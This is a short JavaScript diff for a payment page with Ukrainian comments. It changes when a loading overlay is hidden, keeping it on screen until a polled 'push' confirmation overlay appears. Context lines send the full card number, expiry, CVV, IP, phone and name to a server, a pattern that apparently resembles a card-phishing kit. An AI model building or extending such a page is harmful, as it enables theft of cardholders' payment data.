@@ -298,7 +298,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ email, card, expiry, cvv, ip, page: page_code, page_code, price, currency, phone, name })
             });
-            loadingOverlay.style.display = 'none';
+            // loadingOverlay.style.display = 'none'; // <-- видаляємо
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
                     const msg = document.createElement('div');
@@ -313,7 +313,7 @@
                 console.error('Помилка при відправці даних');
             }
         } catch (error) {
-            loadingOverlay.style.display = 'none';
+            // loadingOverlay.style.display = 'none'; // <-- видаляємо
             console.error('Помилка при зверненні до сервера:', error);
         }
     };
@@ -653,6 +653,7 @@ document.getElementById('back-btn').onclick = function() {
             document.getElementById('push-payment-title').textContent = `Payment ${total} ${currency}`;
             document.getElementById('push-overlay').style.display = 'flex';
             document.getElementById('payment-card-main').style.display = 'none';
+            if (window.loadingOverlay) loadingOverlay.style.display = 'none';
           } else {
             setTimeout(pollPushOverlay, 2000);
           }
